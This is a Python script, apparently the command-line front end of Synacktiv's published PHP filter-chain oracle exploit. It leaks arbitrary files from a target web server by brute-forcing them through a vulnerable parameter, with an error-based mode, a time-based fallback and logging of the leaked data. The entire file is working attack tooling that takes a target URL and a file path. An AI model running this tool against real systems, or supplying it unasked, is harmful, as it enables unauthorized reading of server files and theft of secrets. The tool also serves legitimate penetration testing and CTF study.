#!/usr/bin/env python3
###
### c/o
### https://github.com/synacktiv/php_filter_chains_oracle_exploit/tree/main
### https://github.com/synacktiv/php_filter_chains_oracle_exploit/blob/main/filters_chain_oracle_exploit.py
### 
import sys
import signal
import argparse
import json
from filters_chain_oracle.core.requestor import Requestor
from filters_chain_oracle.core.verb import Verb
from filters_chain_oracle.core.bruteforcer import RequestorBruteforcer

"""
Class FiltersChainOracle, defines all the CLI logic.
- useful info -
This tool is based on the following script : https://github.com/DownUnderCTF/Challenges_2022_Public/blob/main/web/minimal-php/solve/solution.py
Each step of this trick is detailed in the following blogpost : https://www.synacktiv.com/publications/php-filter-chains-file-read-from-error-based-oracle
"""
class FiltersChainOracle():
    def __init__(self):
        self.requestor = None
        self.bruteforcer = None

    """
    Function managing interuption
    """
    def signal_handler(self, sig, frame):
        print("[*] File leak gracefully stopped.")
        print("[+] File {} was partially leaked".format(self.requestor.file_to_leak))
        print(self.bruteforcer.base64)
        print(self.bruteforcer.data)
        if self.log_file:
                self.log_in_file("# The following data was leaked from {} from the file {}\n{}\n".format(self.requestor.target, self.requestor.file_to_leak, self.bruteforcer.data.decode("utf-8")))
        sys.exit(1)
    
    """
    Function managing log file
    """
    def log_in_file(self, content):
        print("[*] Info logged in : {}".format(self.log_file))
        with open(self.log_file, "a") as file:
            file.write(content)
            file.flush()

    """
    Function managing CLI arguments
    """
    def main(self):
        #signal management
        usage = """
        Oracle error based file leaker based on PHP filters.
        Author of the tool : @_remsio_
        Trick firstly discovered by : @hash_kitten
        ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
        $ python3 filters_chain_oracle_exploit.py --target http://127.0.0.1 --file '/test' --parameter 0   
        [*] The following URL is targeted : http://127.0.0.1
        [*] The following local file is leaked : /test
        [*] Running POST requests
        [+] File /test leak is finished!
        b'SGVsbG8gZnJvbSBTeW5hY2t0aXYncyBibG9ncG9zdCEK'
        b"Hello from Synacktiv's blogpost!\\n"
        """
        # Parsing command line arguments
        parser = argparse.ArgumentParser(description=usage, formatter_class=argparse.RawTextHelpFormatter)
        parser.add_argument("--target", help="URL on which you want to run the exploit.", required=True)
        parser.add_argument("--file", help="Path to the file you want to leak.", required=True)
        parser.add_argument("--parameter", help="Parameter to exploit.", required=True)
        parser.add_argument("--data", help="Additionnal data that might be required. (ex : {\"string\":\"value\"})", required=False)
        parser.add_argument("--headers", help="Headers used by the request. (ex : {\"Authorization\":\"Bearer [TOKEN]\"})", required=False)
        parser.add_argument("--verb", help="HTTP verb to use POST(default),GET(~ 135 chars by default),PUT,DELETE", required=False)
        parser.add_argument("--proxy", help="Proxy you would like to use to run the exploit. (ex : http://127.0.0.1:8080)", required=False)
        parser.add_argument("--in_chain", help="Useful to bypass weak strpos configurations, adds the string in the chain. (ex : KEYWORD)", required=False)
        parser.add_argument("--time_based_attack", help="Exploits the oracle as a time base attack, can be improved. (ex : True)", required=False)
        parser.add_argument("--delay", help="Set the delay in second between each request. (ex : 1, 0.1)", required=False)
        parser.add_argument("--json", help="Send data as JSON (--json=1)", required=False)
        parser.add_argument("--match", help="Match a pattern in the response as the oracle (--match='Allowed memory size of')", required=False)
        parser.add_argument("--offset", help="Offset from which a char should be leaked (--offset=100)", required=False, type=int)
        parser.add_argument("--log", help="Path to log file (--log=/tmp/output.log)", required=False)
        args = parser.parse_args()
        # Time based attack management
        if args.time_based_attack:
            time_based_attack=args.time_based_attack
        else:
            time_based_attack=False
        # Delay management
        if args.delay:
            delay = args.delay
        else:
            delay = 0.0
        # Data management
        if args.data:
            try:
                json.loads(args.data)
            except ValueError as err:
                print("[-] data JSON could not be loaded, please make it valid")
                exit()
            data=args.data
        else:
            data="{}"
        # Headers management
        if args.headers:
            try:
                json.loads(args.headers)
            except ValueError as err:
                print("[-] headers JSON could not be loaded, please make it valid")
                exit()
            headers=args.headers
        else:
            headers="{}"
        # Verb management
        if args.verb:
            try:
                verb = Verb[args.verb]
            except KeyError:
                verb = Verb.POST
        else:
            verb = Verb.POST
        if args.in_chain:
            in_chain = args.in_chain
        else:
            in_chain = ""

        # Delay management
        json_input = False
        if args.json:
            json_input = True
        
        # Match pattern
        match = False
        if args.match:
            match = args.match
        
        # Offset from which a char should be leaked

        offset = 0
        if args.offset:
            offset = args.offset
        
        # Log file path
        self.log_file = False
        if args.log:
            self.log_file = args.log
            
        # Attack launcher
        self.requestor = Requestor(args.file, args.target, args.parameter, data, headers, verb, in_chain, args.proxy, time_based_attack, delay, json_input, match)
        self.bruteforcer = RequestorBruteforcer(self.requestor, offset)
        signal.signal(signal.SIGINT, self.signal_handler)

        # Auto fallback to time based attack

        self.bruteforcer.bruteforce()

        # Result parsing
        if self.bruteforcer.base64:
            print("[+] File {} leak is finished!".format(self.requestor.file_to_leak))
            print(self.bruteforcer.base64)
            print(self.bruteforcer.data)
            if self.log_file:
                self.log_in_file("# The following data was leaked from {} from the file {}\n{}\n".format(self.requestor.target, self.requestor.file_to_leak, self.bruteforcer.data.decode("utf-8")))
            exit()
        else:
            print("[-] File {} is either empty, or the exploit did not work :(".format(self.requestor.file_to_leak))
            time_based_attack = 1
            print("[*] Auto fallback to time based attack")
            self.requestor = Requestor(args.file, args.target, args.parameter, data, headers, verb, in_chain, args.proxy, time_based_attack, delay, json_input, match)
            self.bruteforcer = RequestorBruteforcer(self.requestor, offset)
            self.bruteforcer.bruteforce()
        
        if verb == Verb.GET:
            print("[*] You passed your payload on a GET parameter, the leak might be partial! (~135 chars max by default)")
        
        print(self.bruteforcer.base64)
        print(self.bruteforcer.data)

if __name__ == "__main__":
    filters_chain_oracle = FiltersChainOracle()
    filters_chain_oracle.main()
    sys.exit(0)
##
##
